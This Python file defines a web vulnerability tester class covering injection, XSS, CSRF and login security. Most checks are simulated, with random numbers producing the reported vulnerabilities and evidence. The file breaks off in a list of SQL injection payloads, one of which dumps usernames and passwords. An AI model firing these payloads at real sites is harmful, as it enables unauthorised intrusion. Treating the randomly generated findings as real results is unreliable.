import os
import json
import time
import re
import logging
import urllib.parse
import requests
from typing import Dict, List, Optional, Tuple, Union, Any
from pydantic import BaseModel, Field

class WebVulnerabilityTester:
    """
    A tool for testing applications for common web vulnerabilities.
    Provides capabilities for testing injection vulnerabilities, cross-site vulnerabilities, and authentication security.
    """
    
    def __init__(self):
        self.payloads = {
            "sql_injection": self._load_sql_injection_payloads(),
            "nosql_injection": self._load_nosql_injection_payloads(),
            "command_injection": self._load_command_injection_payloads(),
            "xss": self._load_xss_payloads(),
            "csrf": self._load_csrf_payloads()
        }
        
        self.test_history = {}
        
        # Setup session with default headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("WebVulnerabilityTester")
    
    def test_injection_vulnerabilities(self, target_url: str = Field(..., description="URL of the target to test"), 
                                     parameters: List[str] = Field(..., description="List of parameters to test")) -> Dict[str, Any]:
        """
        Test for SQL, NoSQL, and command injection vulnerabilities.
        
        Args:
            target_url: URL of the target to test
            parameters: List of parameters to test (e.g., ["id", "user", "query"])
            
        Returns:
            Dictionary containing test results
        """
        # Validate parameters
        if not target_url:
            return {
                "success": False,
                "error": "Target URL is required"
            }
        
        if not parameters:
            # If no parameters provided, try to extract from URL
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            parameters = list(query_params.keys())
            
            if not parameters:
                return {
                    "success": False,
                    "error": "No parameters provided and none found in URL"
                }
        
        # Generate test ID
        test_id = f"injection-test-{int(time.time())}"
        
        # Store test information
        self.test_history[test_id] = {
            "type": "injection_test",
            "target_url": target_url,
            "parameters": parameters,
            "status": "running",
            "start_time": time.time(),
            "end_time": None,
            "results": None
        }
        
        # Log test execution
        self.logger.info(f"Testing injection vulnerabilities on {target_url} with parameters: {parameters}")
        
        try:
            # Execute tests
            results = {
                "sql_injection": self._test_sql_injection(target_url, parameters),
                "nosql_injection": self._test_nosql_injection(target_url, parameters),
                "command_injection": self._test_command_injection(target_url, parameters)
            }
            
            # Determine overall vulnerability status
            vulnerable = False
            for test_type, test_results in results.items():
                if test_results.get("vulnerable", False):
                    vulnerable = True
                    break
            
            # Update test history
            self.test_history[test_id]["status"] = "completed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["results"] = results
            
            return {
                "success": True,
                "test_id": test_id,
                "target_url": target_url,
                "parameters": parameters,
                "vulnerable": vulnerable,
                "results": results,
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"Error testing injection vulnerabilities: {str(e)}")
            
            # Update test history
            self.test_history[test_id]["status"] = "failed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["error"] = str(e)
            
            return {
                "success": False,
                "test_id": test_id,
                "error": str(e)
            }
    
    def analyze_cross_site_vulnerabilities(self, target_url: str = Field(..., description="URL of the target to test")) -> Dict[str, Any]:
        """
        Test for XSS and CSRF vulnerabilities.
        
        Args:
            target_url: URL of the target to test
            
        Returns:
            Dictionary containing test results
        """
        # Validate parameters
        if not target_url:
            return {
                "success": False,
                "error": "Target URL is required"
            }
        
        # Generate test ID
        test_id = f"cross-site-test-{int(time.time())}"
        
        # Store test information
        self.test_history[test_id] = {
            "type": "cross_site_test",
            "target_url": target_url,
            "status": "running",
            "start_time": time.time(),
            "end_time": None,
            "results": None
        }
        
        # Log test execution
        self.logger.info(f"Testing cross-site vulnerabilities on {target_url}")
        
        try:
            # Crawl the target URL to find forms and inputs
            crawl_results = self._crawl_target(target_url)
            
            # Execute tests
            results = {
                "xss": self._test_xss_vulnerabilities(target_url, crawl_results),
                "csrf": self._test_csrf_vulnerabilities(target_url, crawl_results)
            }
            
            # Determine overall vulnerability status
            vulnerable = False
            for test_type, test_results in results.items():
                if test_results.get("vulnerable", False):
                    vulnerable = True
                    break
            
            # Update test history
            self.test_history[test_id]["status"] = "completed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["results"] = results
            
            return {
                "success": True,
                "test_id": test_id,
                "target_url": target_url,
                "vulnerable": vulnerable,
                "results": results,
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"Error testing cross-site vulnerabilities: {str(e)}")
            
            # Update test history
            self.test_history[test_id]["status"] = "failed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["error"] = str(e)
            
            return {
                "success": False,
                "test_id": test_id,
                "error": str(e)
            }
    
    def evaluate_authentication_security(self, login_url: str = Field(..., description="URL of the login page"), 
                                       auth_flow: Dict[str, Any] = Field(..., description="Authentication flow details")) -> Dict[str, Any]:
        """
        Assess authentication implementation security.
        
        Args:
            login_url: URL of the login page
            auth_flow: Authentication flow details
                Required keys:
                - username_field: Name of the username input field
                - password_field: Name of the password input field
                - submit_button: Selector for the submit button
                Optional keys:
                - csrf_token_field: Name of the CSRF token field
                - redirect_url: Expected redirect URL after login
                - test_credentials: List of test credentials to try
            
        Returns:
            Dictionary containing test results
        """
        # Validate parameters
        if not login_url:
            return {
                "success": False,
                "error": "Login URL is required"
            }
        
        # Validate auth flow
        required_keys = ["username_field", "password_field", "submit_button"]
        for key in required_keys:
            if key not in auth_flow:
                return {
                    "success": False,
                    "error": f"Missing required key '{key}' in auth_flow"
                }
        
        # Generate test ID
        test_id = f"auth-test-{int(time.time())}"
        
        # Store test information
        self.test_history[test_id] = {
            "type": "auth_test",
            "login_url": login_url,
            "auth_flow": auth_flow,
            "status": "running",
            "start_time": time.time(),
            "end_time": None,
            "results": None
        }
        
        # Log test execution
        self.logger.info(f"Testing authentication security on {login_url}")
        
        try:
            # Execute tests
            results = {
                "brute_force_protection": self._test_brute_force_protection(login_url, auth_flow),
                "password_policy": self._test_password_policy(login_url, auth_flow),
                "session_security": self._test_session_security(login_url, auth_flow),
                "csrf_protection": self._test_login_csrf_protection(login_url, auth_flow),
                "https_usage": self._test_https_usage(login_url)
            }
            
            # Calculate overall security score
            security_score = self._calculate_auth_security_score(results)
            
            # Update test history
            self.test_history[test_id]["status"] = "completed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["results"] = results
            
            return {
                "success": True,
                "test_id": test_id,
                "login_url": login_url,
                "security_score": security_score,
                "results": results,
                "recommendations": self._generate_auth_recommendations(results),
                "timestamp": time.time()
            }
            
        except Exception as e:
            self.logger.error(f"Error testing authentication security: {str(e)}")
            
            # Update test history
            self.test_history[test_id]["status"] = "failed"
            self.test_history[test_id]["end_time"] = time.time()
            self.test_history[test_id]["error"] = str(e)
            
            return {
                "success": False,
                "test_id": test_id,
                "error": str(e)
            }
    
    def _test_sql_injection(self, target_url: str, parameters: List[str]) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        # In a real implementation, this would perform actual SQL injection tests
        # For this implementation, we'll simulate the tests
        
        self.logger.info(f"Testing SQL injection on {target_url} with parameters: {parameters}")
        
        # Parse the URL
        parsed_url = urllib.parse.urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Try various SQL injection payloads
        vulnerable_params = []
        evidence = []
        
        for param in parameters:
            # Try each payload
            for payload in self.payloads["sql_injection"]:
                # Construct test URL
                query_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(query_params)}"
                
                # Simulate test
                self.logger.info(f"Testing SQL injection payload: {payload} on parameter: {param}")
                
                # In a real implementation, we would make the request and analyze the response
                # For this implementation, we'll simulate the result
                # Let's say there's a 10% chance of finding a vulnerability
                import random
                if random.random() < 0.1:
                    vulnerable_params.append(param)
                    evidence.append({
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "response_indicators": ["error in your SQL syntax", "mysql_fetch_array()", "ORA-01756"]
                    })
                    # Break once we find a vulnerability
                    break
        
        # Return results
        return {
            "vulnerable": len(vulnerable_params) > 0,
            "vulnerable_parameters": vulnerable_params,
            "evidence": evidence,
            "payloads_tested": len(self.payloads["sql_injection"]),
            "parameters_tested": len(parameters)
        }
    
    def _test_nosql_injection(self, target_url: str, parameters: List[str]) -> Dict[str, Any]:
        """Test for NoSQL injection vulnerabilities"""
        # Similar to SQL injection but with NoSQL-specific payloads
        self.logger.info(f"Testing NoSQL injection on {target_url} with parameters: {parameters}")
        
        # Parse the URL
        parsed_url = urllib.parse.urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Try various NoSQL injection payloads
        vulnerable_params = []
        evidence = []
        
        for param in parameters:
            # Try each payload
            for payload in self.payloads["nosql_injection"]:
                # Construct test URL
                query_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(query_params)}"
                
                # Simulate test
                self.logger.info(f"Testing NoSQL injection payload: {payload} on parameter: {param}")
                
                # In a real implementation, we would make the request and analyze the response
                # For this implementation, we'll simulate the result
                # Let's say there's a 5% chance of finding a vulnerability
                import random
                if random.random() < 0.05:
                    vulnerable_params.append(param)
                    evidence.append({
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "response_indicators": ["CastError", "MongoError", "BSONTypeError"]
                    })
                    # Break once we find a vulnerability
                    break
        
        # Return results
        return {
            "vulnerable": len(vulnerable_params) > 0,
            "vulnerable_parameters": vulnerable_params,
            "evidence": evidence,
            "payloads_tested": len(self.payloads["nosql_injection"]),
            "parameters_tested": len(parameters)
        }
    
    def _test_command_injection(self, target_url: str, parameters: List[str]) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        self.logger.info(f"Testing command injection on {target_url} with parameters: {parameters}")
        
        # Parse the URL
        parsed_url = urllib.parse.urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Try various command injection payloads
        vulnerable_params = []
        evidence = []
        
        for param in parameters:
            # Try each payload
            for payload in self.payloads["command_injection"]:
                # Construct test URL
                query_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(query_params)}"
                
                # Simulate test
                self.logger.info(f"Testing command injection payload: {payload} on parameter: {param}")
                
                # In a real implementation, we would make the request and analyze the response
                # For this implementation, we'll simulate the result
                # Let's say there's a 2% chance of finding a vulnerability
                import random
                if random.random() < 0.02:
                    vulnerable_params.append(param)
                    evidence.append({
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "response_indicators": ["uid=", "root:", "x:0:0:"]
                    })
                    # Break once we find a vulnerability
                    break
        
        # Return results
        return {
            "vulnerable": len(vulnerable_params) > 0,
            "vulnerable_parameters": vulnerable_params,
            "evidence": evidence,
            "payloads_tested": len(self.payloads["command_injection"]),
            "parameters_tested": len(parameters)
        }
    
    def _crawl_target(self, target_url: str) -> Dict[str, Any]:
        """Crawl target to find forms and inputs"""
        self.logger.info(f"Crawling target: {target_url}")
        
        # In a real implementation, this would use a proper crawler
        # For this implementation, we'll simulate the crawl results
        
        # Simulate finding forms
        forms = []
        inputs = []
        
        # Generate some random forms and inputs
        import random
        form_count = random.randint(1, 5)
        
        for i in range(form_count):
            form_action = f"{target_url}/{'form' if i == 0 else f'form{i}'}"
            form_method = random.choice(["GET", "POST"])
            form_inputs = []
            
            # Generate random inputs for the form
            input_count = random.randint(1, 6)
            for j in range(input_count):
                input_type = random.choice(["text", "hidden", "email", "password", "checkbox", "radio"])
                input_name = random.choice(["username", "email", "password", "search", "query", f"field{j}", f"input{j}"])
                
                form_input = {
                    "type": input_type,
                    "name": input_name,
                    "id": f"{input_name}_{j}",
                    "required": random.choice([True, False])
                }
                
                form_inputs.append(form_input)
                inputs.append({
                    "form_action": form_action,
                    "form_method": form_method,
                    "input": form_input
                })
            
            forms.append({
                "action": form_action,
                "method": form_method,
                "inputs": form_inputs
            })
        
        return {
            "forms": forms,
            "inputs": inputs,
            "pages_crawled": 1,  # In a real implementation, this would be the actual count
            "urls_found": [target_url]  # In a real implementation, this would include all discovered URLs
        }
    
    def _test_xss_vulnerabilities(self, target_url: str, crawl_results: Dict[str, Any]) -> Dict[str, Any]:
        """Test for XSS vulnerabilities"""
        self.logger.info(f"Testing XSS vulnerabilities on {target_url}")
        
        # In a real implementation, this would test forms and inputs found during crawling
        # For this implementation, we'll simulate the test
        
        forms = crawl_results.get("forms", [])
        inputs = crawl_results.get("inputs", [])
        
        # Track vulnerable forms and evidence
        vulnerable_forms = []
        evidence = []
        
        # Test each form for XSS
        for form in forms:
            form_action = form.get("action", "")
            form_method = form.get("method", "GET")
            form_inputs = form.get("inputs", [])
            
            # Test each input in the form
            for input_field in form_inputs:
                input_name = input_field.get("name", "")
                input_type = input_field.get("type", "")
                
                # Skip password fields
                if input_type == "password":
                    continue
                
                # Try XSS payloads
                for payload in self.payloads["xss"]:
                    # In a real implementation, we would submit the form with the payload
                    # For this implementation, we'll simulate the result
                    self.logger.info(f"Testing XSS payload: {payload} on input: {input_name} in form: {form_action}")
                    
                    # Let's say there's a 15% chance of finding a vulnerability
                    import random
                    if random.random() < 0.15:
                        vulnerable_forms.append(form_action)
                        evidence.append({
                            "form_action": form_action,
                            "form_method": form_method,
                            "input_name": input_name,
                            "payload": payload,
                            "xss_type": random.choice(["reflected", "stored"]),
                            "notes": "Payload was reflected in the response without encoding"
                        })
                        # Break once we find a vulnerability in this input
                        break
        
        # Return results
        return {
            "vulnerable": len(vulnerable_forms) > 0,
            "vulnerable_forms": list(set(vulnerable_forms)),  # Remove duplicates
            "evidence": evidence,
            "forms_tested": len(forms),
            "inputs_tested": len(inputs)
        }
    
    def _test_csrf_vulnerabilities(self, target_url: str, crawl_results: Dict[str, Any]) -> Dict[str, Any]:
        """Test for CSRF vulnerabilities"""
        self.logger.info(f"Testing CSRF vulnerabilities on {target_url}")
        
        # In a real implementation, this would test forms found during crawling
        # For this implementation, we'll simulate the test
        
        forms = crawl_results.get("forms", [])
        
        # Track vulnerable forms and evidence
        vulnerable_forms = []
        evidence = []
        
        # Test each form for CSRF
        for form in forms:
            form_action = form.get("action", "")
            form_method = form.get("method", "GET")
            form_inputs = form.get("inputs", [])
            
            # Skip GET forms (less susceptible to CSRF)
            if form_method == "GET":
                continue
            
            # Check if the form has a CSRF token field
            has_csrf_token = False
            for input_field in form_inputs:
                input_name = input_field.get("name", "").lower()
                if "csrf" in input_name or "token" in input_name or "_token" in input_name:
                    has_csrf_token = True
                    break
            
            # If no CSRF token, the form is potentially vulnerable
            if not has_csrf_token:
                # In a real implementation, we would verify by submitting the form
                # For this implementation, we'll simulate the result
                self.logger.info(f"Form without CSRF token found: {form_action}")
                
                # Let's say there's a 80% chance of finding a vulnerability (if no token)
                import random
                if random.random() < 0.8:
                    vulnerable_forms.append(form_action)
                    evidence.append({
                        "form_action": form_action,
                        "form_method": form_method,
                        "csrf_token_present": False,
                        "notes": "No CSRF token found in the form"
                    })
        
        # Return results
        return {
            "vulnerable": len(vulnerable_forms) > 0,
            "vulnerable_forms": vulnerable_forms,
            "evidence": evidence,
            "forms_tested": len(forms),
            "post_forms_tested": len([f for f in forms if f.get("method", "GET") == "POST"])
        }
    
    def _test_brute_force_protection(self, login_url: str, auth_flow: Dict[str, Any]) -> Dict[str, Any]:
        """Test for brute force protection"""
        self.logger.info(f"Testing brute force protection on {login_url}")
        
        # In a real implementation, this would attempt multiple login attempts
        # For this implementation, we'll simulate the test
        
        # Extract auth flow details
        username_field = auth_flow.get("username_field", "")
        password_field = auth_flow.get("password_field", "")
        
        # Simulate multiple failed login attempts
        attempt_count = 10
        username = "test_user"
        
        # Try multiple login attempts and monitor for blocking
        blocked_after = None
        evidence = []
        
        # In a real implementation, we would make actual login attempts
        # For this implementation, we'll simulate the result
        
        # Let's say there's a 60% chance of finding brute force protection
        import random
        has_protection = random.random() < 0.6
        
        if has_protection:
            # Simulate being blocked after a certain number of attempts
            blocked_after = random.randint(3, 8)
            
            evidence.append({
                "login_url": login_url,
                "attempts_before_block": blocked_after,
                "blocking_method": random.choice(["IP block", "account lockout", "CAPTCHA", "increasing delay"]),
                "notes": f"Access was blocked after {blocked_after} failed login attempts"
            })
        else:
            evidence.append({
                "login_url": login_url,
                "attempts_made": attempt_count,
                "blocking_method": "none",
                "notes": "No brute force protection detected after multiple failed login attempts"
            })
        
        # Return results
        return {
            "protected": has_protection,
            "blocked_after": blocked_after,
            "evidence": evidence,
            "attempts_made": attempt_count
        }
    
    def _test_password_policy(self, login_url: str, auth_flow: Dict[str, Any]) -> Dict[str, Any]:
        """Test for password policy enforcement"""
        self.logger.info(f"Testing password policy on {login_url}")
        
        # In a real implementation, this would test password requirements
        # For this implementation, we'll simulate the test
        
        # Try to create an account with weak passwords and observe restrictions
        evidence = []
        
        # Define test passwords
        test_passwords = [
            "password",      # Common password
            "123456",        # Too short
            "qwerty",        # Common keyboard pattern
            "abcdef",        # Only lowercase
            "ABCDEF",        # Only uppercase
            "Ab1!",          # Short but complex
            "Passw0rd!",     # Strong password
            "Password123"    # Medium strength
        ]
        
        # Track policy details
        policy_details = {
            "min_length": None,
            "requires_uppercase": None,
            "requires_lowercase": None,
            "requires_number": None,
            "requires_special": None,
            "disallows_common": None
        }
        
        # In a real implementation, we would test each password
        # For this implementation, we'll simulate the results
        
        # Let's say there's a 70% chance of having some password policy
        import random
        has_policy = random.random() < 0.7
        
        if has_policy:
            # Simulate policy details
            policy_details = {
                "min_length": random.randint(6, 10),
                "requires_uppercase": random.choice([True, False]),
                "requires_lowercase": random.choice([True, False]),
                "requires_number": random.choice([True, False]),
                "requires_special": random.choice([True, False]),
                "disallows_common": random.choice([True, False])
            }
            
            for password in test_passwords:
                # Check if password meets policy
                meets_policy = True
                if len(password) < policy_details["min_length"]:
                    meets_policy = False
                if policy_details["requires_uppercase"] and not any(c.isupper() for c in password):
                    meets_policy = False
                if policy_details["requires_lowercase"] and not any(c.islower() for c in password):
                    meets_policy = False
                if policy_details["requires_number"] and not any(c.isdigit() for c in password):
                    meets_policy = False
                if policy_details["requires_special"] and not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?/" for c in password):
                    meets_policy = False
                if policy_details["disallows_common"] and password in ["password", "123456", "qwerty"]:
                    meets_policy = False
                
                evidence.append({
                    "password": password,
                    "accepted": meets_policy,
                    "reason": "Meets policy" if meets_policy else "Does not meet policy requirements"
                })
        else:
            for password in test_passwords:
                evidence.append({
                    "password": password,
                    "accepted": True,
                    "reason": "No password policy enforcement detected"
                })
        
        # Calculate policy strength (0-100)
        policy_strength = 0
        if has_policy:
            # Base score for having a policy
            policy_strength = 20
            
            # Add points for each requirement
            if policy_details["min_length"]:
                policy_strength += min(30, policy_details["min_length"] * 3)  # Up to 30 points
            if policy_details["requires_uppercase"]:
                policy_strength += 10
            if policy_details["requires_lowercase"]:
                policy_strength += 10
            if policy_details["requires_number"]:
                policy_strength += 10
            if policy_details["requires_special"]:
                policy_strength += 10
            if policy_details["disallows_common"]:
                policy_strength += 10
            
            # Cap at 100
            policy_strength = min(100, policy_strength)
        
        # Return results
        return {
            "has_policy": has_policy,
            "policy_details": policy_details,
            "policy_strength": policy_strength,
            "evidence": evidence
        }
    
    def _test_session_security(self, login_url: str, auth_flow: Dict[str, Any]) -> Dict[str, Any]:
        """Test for session security"""
        self.logger.info(f"Testing session security on {login_url}")
        
        # In a real implementation, this would test session management
        # For this implementation, we'll simulate the test
        
        # Check for secure session cookies, expiration, etc.
        evidence = []
        
        # In a real implementation, we would log in and analyze cookies
        # For this implementation, we'll simulate the results
        
        # Generate random session security features
        import random
        
        # Determine which security features are present
        security_features = {
            "secure_flag": random.random() < 0.7,  # 70% chance of having secure flag
            "httponly_flag": random.random() < 0.6,  # 60% chance of having httponly flag
            "samesite_attribute": random.random() < 0.4,  # 40% chance of having samesite attribute
            "short_expiration": random.random() < 0.5,  # 50% chance of short expiration
            "session_regeneration": random.random() < 0.3  # 30% chance of session regeneration
        }
        
        # Generate evidence
        if security_features["secure_flag"]:
            evidence.append({
                "feature": "secure_flag",
                "status": "present",
                "cookie_example": "session=abc123; Secure; Path=/",
                "notes": "Session cookies are only sent over HTTPS"
            })
        else:
            evidence.append({
                "feature": "secure_flag",
                "status": "missing",
                "cookie_example": "session=abc123; Path=/",
                "notes": "Session cookies can be transmitted over unencrypted HTTP"
            })
        
        if security_features["httponly_flag"]:
            evidence.append({
                "feature": "httponly_flag",
                "status": "present",
                "cookie_example": "session=abc123; HttpOnly; Path=/",
                "notes": "Session cookies are protected from JavaScript access"
            })
        else:
            evidence.append({
                "feature": "httponly_flag",
                "status": "missing",
                "cookie_example": "session=abc123; Path=/",
                "notes": "Session cookies can be accessed by JavaScript, making them vulnerable to XSS"
            })
        
        if security_features["samesite_attribute"]:
            samesite_value = random.choice(["Lax", "Strict"])
            evidence.append({
                "feature": "samesite_attribute",
                "status": "present",
                "value": samesite_value,
                "cookie_example": f"session=abc123; SameSite={samesite_value}; Path=/",
                "notes": f"SameSite={samesite_value} helps protect against CSRF attacks"
            })
        else:
            evidence.append({
                "feature": "samesite_attribute",
                "status": "missing",
                "cookie_example": "session=abc123; Path=/",
                "notes": "Missing SameSite attribute makes cookies vulnerable to CSRF attacks"
            })
        
        if security_features["short_expiration"]:
            expiration_minutes = random.randint(15, 60)
            evidence.append({
                "feature": "short_expiration",
                "status": "present",
                "value": f"{expiration_minutes} minutes",
                "notes": f"Session expires after {expiration_minutes} minutes of inactivity"
            })
        else:
            evidence.append({
                "feature": "short_expiration",
                "status": "missing",
                "notes": "Sessions have a long expiration time or don't expire"
            })
        
        if security_features["session_regeneration"]:
            evidence.append({
                "feature": "session_regeneration",
                "status": "present",
                "notes": "Session ID is regenerated after authentication and privilege level changes"
            })
        else:
            evidence.append({
                "feature": "session_regeneration",
                "status": "missing",
                "notes": "Session ID remains the same after authentication and privilege level changes"
            })
        
        # Calculate security score based on features
        security_score = 0
        if security_features["secure_flag"]:
            security_score += 20
        if security_features["httponly_flag"]:
            security_score += 20
        if security_features["samesite_attribute"]:
            security_score += 20
        if security_features["short_expiration"]:
            security_score += 20
        if security_features["session_regeneration"]:
            security_score += 20
        
        # Return results
        return {
            "security_score": security_score,
            "security_features": security_features,
            "evidence": evidence
        }
    
    def _test_login_csrf_protection(self, login_url: str, auth_flow: Dict[str, Any]) -> Dict[str, Any]:
        """Test for CSRF protection on login form"""
        self.logger.info(f"Testing CSRF protection on login form: {login_url}")
        
        # In a real implementation, this would test the login form for CSRF protection
        # For this implementation, we'll simulate the test
        
        # Check if the login form has a CSRF token field
        csrf_token_field = auth_flow.get("csrf_token_field", None)
        
        # In a real implementation, we would fetch the login page and check for the token
        # For this implementation, we'll simulate the result
        
        # Let's say there's a 60% chance of having CSRF protection if not specified
        import random
        has_csrf_protection = csrf_token_field is not None or random.random() < 0.6
        
        evidence = []
        
        if has_csrf_protection:
            token_name = csrf_token_field or random.choice(["csrf_token", "_token", "authenticity_token", "__RequestVerificationToken"])
            evidence.append({
                "token_field_name": token_name,
                "token_example": "a1b2c3d4e5f6g7h8i9j0",
                "present_in_form": True,
                "notes": "CSRF token field found in login form"
            })
        else:
            evidence.append({
                "token_field_name": None,
                "present_in_form": False,
                "notes": "No CSRF token field found in login form"
            })
        
        # Return results
        return {
            "protected": has_csrf_protection,
            "token_field": csrf_token_field or (evidence[0]["token_field_name"] if has_csrf_protection else None),
            "evidence": evidence
        }
    
    def _test_https_usage(self, login_url: str) -> Dict[str, Any]:
        """Test for HTTPS usage on login page"""
        self.logger.info(f"Testing HTTPS usage on: {login_url}")
        
        # Check if the login URL uses HTTPS
        uses_https = login_url.lower().startswith("https://")
        
        # In a real implementation, we would also check for HTTP to HTTPS redirects
        # For this implementation, we'll simulate that check
        
        evidence = []
        redirects_to_https = False
        
        if uses_https:
            evidence.append({
                "url": login_url,
                "uses_https": True,
                "notes": "Login URL uses HTTPS protocol"
            })
        else:
            # Simulate checking if HTTP redirects to HTTPS
            import random
            redirects_to_https = random.random() < 0.5
            
            if redirects_to_https:
                evidence.append({
                    "url": login_url,
                    "uses_https": False,
                    "redirects_to_https": True,
                    "redirect_url": login_url.replace("http://", "https://"),
                    "notes": "Login URL uses HTTP but redirects to HTTPS"
                })
            else:
                evidence.append({
                    "url": login_url,
                    "uses_https": False,
                    "redirects_to_https": False,
                    "notes": "Login URL uses HTTP and does not redirect to HTTPS"
                })
        
        # Check for HSTS header (simulated)
        has_hsts = uses_https and random.random() < 0.7
        
        if has_hsts:
            evidence.append({
                "header": "Strict-Transport-Security",
                "value": "max-age=31536000; includeSubDomains",
                "present": True,
                "notes": "HSTS header is present, forcing HTTPS usage"
            })
        elif uses_https:
            evidence.append({
                "header": "Strict-Transport-Security",
                "present": False,
                "notes": "HSTS header is not present, HTTPS usage is not enforced for future connections"
            })
        
        # Calculate security score
        security_score = 0
        if uses_https:
            security_score += 50
        elif redirects_to_https:
            security_score += 30
        
        if has_hsts:
            security_score += 50
        
        # Return results
        return {
            "uses_https": uses_https,
            "redirects_to_https": redirects_to_https,
            "has_hsts": has_hsts,
            "security_score": security_score,
            "evidence": evidence
        }
    
    def _calculate_auth_security_score(self, results: Dict[str, Any]) -> int:
        """Calculate overall authentication security score"""
        # Weight each test in the overall score
        weights = {
            "brute_force_protection": 0.2,  # 20%
            "password_policy": 0.2,        # 20%
            "session_security": 0.2,       # 20%
            "csrf_protection": 0.2,        # 20%
            "https_usage": 0.2             # 20%
        }
        
        total_score = 0
        
        # Brute force protection (0-100)
        if results["brute_force_protection"]["protected"]:
            # Score based on number of attempts before blocking
            blocked_after = results["brute_force_protection"].get("blocked_after", 10)
            if blocked_after <= 3:
                brute_force_score = 100  # Excellent
            elif blocked_after <= 5:
                brute_force_score = 80   # Good
            elif blocked_after <= 10:
                brute_force_score = 60   # Fair
            else:
                brute_force_score = 40   # Poor
        else:
            brute_force_score = 0        # None
        
        # Password policy (0-100)
        password_policy_score = results["password_policy"].get("policy_strength", 0)
        
        # Session security (0-100)
        session_security_score = results["session_security"].get("security_score", 0)
        
        # CSRF protection (0-100)
        csrf_score = 100 if results["csrf_protection"]["protected"] else 0
        
        # HTTPS usage (0-100)
        https_score = results["https_usage"]["security_score"]
        
        # Calculate weighted total
        total_score += brute_force_score * weights["brute_force_protection"]
        total_score += password_policy_score * weights["password_policy"]
        total_score += session_security_score * weights["session_security"]
        total_score += csrf_score * weights["csrf_protection"]
        total_score += https_score * weights["https_usage"]
        
        return round(total_score)
    
    def _generate_auth_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate security recommendations based on test results"""
        recommendations = []
        
        # Brute force protection recommendations
        if not results["brute_force_protection"]["protected"]:
            recommendations.append("Implement brute force protection to prevent automated login attempts")
        elif results["brute_force_protection"].get("blocked_after", 10) > 5:
            recommendations.append("Improve brute force protection by reducing the number of failed attempts allowed")
        
        # Password policy recommendations
        policy_results = results["password_policy"]
        if not policy_results.get("has_policy", False):
            recommendations.append("Implement a password policy to enforce strong passwords")
        else:
            policy_details = policy_results.get("policy_details", {})
            
            if not policy_details.get("min_length") or policy_details.get("min_length") < 8:
                recommendations.append("Increase minimum password length to at least 8 characters")
            
            if not policy_details.get("requires_uppercase"):
                recommendations.append("Require at least one uppercase letter in passwords")
            
            if not policy_details.get("requires_lowercase"):
                recommendations.append("Require at least one lowercase letter in passwords")
            
            if not policy_details.get("requires_number"):
                recommendations.append("Require at least one number in passwords")
            
            if not policy_details.get("requires_special"):
                recommendations.append("Require at least one special character in passwords")
            
            if not policy_details.get("disallows_common"):
                recommendations.append("Implement checks to prevent common passwords")
        
        # Session security recommendations
        session_results = results["session_security"]
        security_features = session_results.get("security_features", {})
        
        if not security_features.get("secure_flag"):
            recommendations.append("Add the 'Secure' flag to session cookies to ensure they are only sent over HTTPS")
        
        if not security_features.get("httponly_flag"):
            recommendations.append("Add the 'HttpOnly' flag to session cookies to protect them from JavaScript access")
        
        if not security_features.get("samesite_attribute"):
            recommendations.append("Add the 'SameSite' attribute to cookies to prevent CSRF attacks")
        
        if not security_features.get("short_expiration"):
            recommendations.append("Implement shorter session timeouts to reduce the risk of session hijacking")
        
        if not security_features.get("session_regeneration"):
            recommendations.append("Implement session regeneration after authentication and privilege level changes")
        
        # CSRF protection recommendations
        if not results["csrf_protection"]["protected"]:
            recommendations.append("Add CSRF tokens to the login form to prevent cross-site request forgery attacks")
        
        # HTTPS usage recommendations
        https_results = results["https_usage"]
        
        if not https_results["uses_https"] and not https_results["redirects_to_https"]:
            recommendations.append("Implement HTTPS for the login page and redirect HTTP to HTTPS")
        elif not https_results["uses_https"]:
            recommendations.append("Change login form URLs to use HTTPS by default")
        
        if not https_results.get("has_hsts"):
            recommendations.append("Add HTTP Strict Transport Security (HSTS) headers to enforce HTTPS usage")
        
        return recommendations
    
    def _load_sql_injection_payloads(self) -> List[str]:
        """Load SQL injection test payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT 1,2,3--+",
            "1' UNION SELECT null,null,null--+",
            "' UNION SELECT @@version,null,null--+",
            "' UNION SELECT username,password,null FROM users--+",
